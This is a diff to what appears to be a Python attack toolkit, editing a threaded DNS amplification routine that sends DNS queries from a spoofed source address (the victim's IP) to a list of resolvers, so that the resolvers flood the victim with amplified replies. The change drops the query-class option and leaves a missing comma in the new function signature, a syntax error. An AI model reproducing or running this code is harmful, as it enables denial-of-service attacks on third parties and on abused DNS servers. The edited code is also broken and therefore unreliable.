@@ -1972,7 +1972,7 @@ class dampli(threading.Thread):
   while (stop!=True):
    try:
     ip=random.choice(dnsl)
-    packet= IP(src=target, dst=ip) / UDP(sport=port,dport=53) / DNS(rd=1, qd=DNSQR(qname=random.choice(domainl), qtype=query, qclass=quclass))
+    packet= IP(src=target, dst=ip) / UDP(sport=port,dport=53) / DNS(rd=1, qd=DNSQR(qname=random.choice(domainl), qtype=query))
     s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     packet=str(packet)
@@ -1985,7 +1985,7 @@ class dampli(threading.Thread):
    except Exception as e:
     pass
    time.sleep(.1)
-def dnsamplif(u,p=80,dnslist=[],threads=100,q='ALL',cl='IN',interval=300,logs=True,returning=False):
+def dnsamplif(u,p=80,dnslist=[],threads=100,q='ALL'interval=300,logs=True,returning=False):
  '''
    this function is for DNS amplification attack using and list of DNS servers provided by the user.
 
@@ -1995,7 +1995,6 @@ def dnsamplif(u,p=80,dnslist=[],threads=100,q='ALL',cl='IN',interval=300,logs=Tr
    dnslist: your DNS servers list
    threads: (set by default to: 100)
    q: (set by default to: "ALL") query type
-   cl: (set by default to: "IN") query's class
 
    exapmle:
 
@@ -2015,8 +2014,6 @@ def dnsamplif(u,p=80,dnslist=[],threads=100,q='ALL',cl='IN',interval=300,logs=Tr
  dnsl=dnslist
  global query
  query=q
- global quclass
- quclass=cl
  wh=0
  try:
   s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
